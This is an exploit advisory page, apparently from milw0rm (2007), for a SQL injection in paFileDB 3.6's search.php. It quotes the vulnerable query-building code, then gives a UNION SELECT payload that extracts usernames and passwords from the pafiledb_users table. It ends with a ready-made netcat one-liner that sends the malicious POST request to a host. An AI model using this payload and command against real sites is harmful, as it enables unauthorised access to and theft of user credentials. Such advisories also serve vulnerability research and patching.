<html><head><title>paFileDB 3.6 (search.php) Remote SQL Injection Vulnerability</title></head><pre>Site: http://www.phparena.net/pafiledb
Description: SQL injection (categories) in includes/search.php
Code: $results = $db-&gt;GetArray(&quot;SELECT * FROM &quot;.$dbPrefix.&quot;files WHERE (&quot;.$searchin.&quot;) AND file_catid IN (&quot;.implode(',',$_POST['categories']).&quot;)&quot;);

Comment:&quot;ouuch&quot;

SQL: ) UNION SELECT ALL null,user_username,user_password,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null FROM (pafiledb_users

POC:
host=&quot;www.example.com&quot;; echo -e &quot;POST
http://$host/index.php?act=search&amp;process HTTP/1.1\nHost:
$host\nContent-Length:
302\n\nquery=test&amp;search_in[]=file_name&amp;search_in[]=file_desc&amp;search_in[]=file_longdesc&amp;search_in[]=file_creator&amp;search_in[]=file_version&amp;categories[]=1)
UNION SELECT ALL
null,user_username,user_password,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null
FROM (pafiledb_users&quot;| netcat $host 80

Vendor: was informed, but did not response yet...
credits: h4si &amp; pUm

# milw0rm.com [2007-07-14]</pre></html>